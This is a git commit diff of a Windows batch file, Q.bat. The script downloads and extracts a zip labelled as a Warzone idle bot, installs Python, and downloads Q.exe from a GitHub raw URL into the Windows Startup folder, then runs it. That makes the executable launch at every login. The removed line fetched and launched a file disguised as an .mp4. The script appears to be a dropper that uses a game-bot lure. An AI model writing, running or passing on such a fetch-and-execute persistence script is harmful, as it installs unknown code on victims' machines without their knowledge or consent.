c5eb44d7f7b05c31fdd684814a9ae1c67365ede5
bloostone <49822986+bloostone@users.noreply.github.com>
2021-07-07 20:38:36 -0700

    Update Q.bat

--- Q.bat
+++ Q.bat
@@ -1,3 +1,10 @@
-powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/tumblr_q8pbmd8vOI1xu4fa8.mp4 -OutFile Q.mp4" && Q.mp4
+cd %homepath%\desktop
+powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/warzone-idle-bot-master.zip -OutFile WZB.zip"
+powershell "Expand-Archive -Force WZB.zip"
+del /f WZB.zip
+cd %appdata%\TmpFiles
+powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe -Outfile PythonInstall.exe"
+Pythoninstall.exe
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
+exit
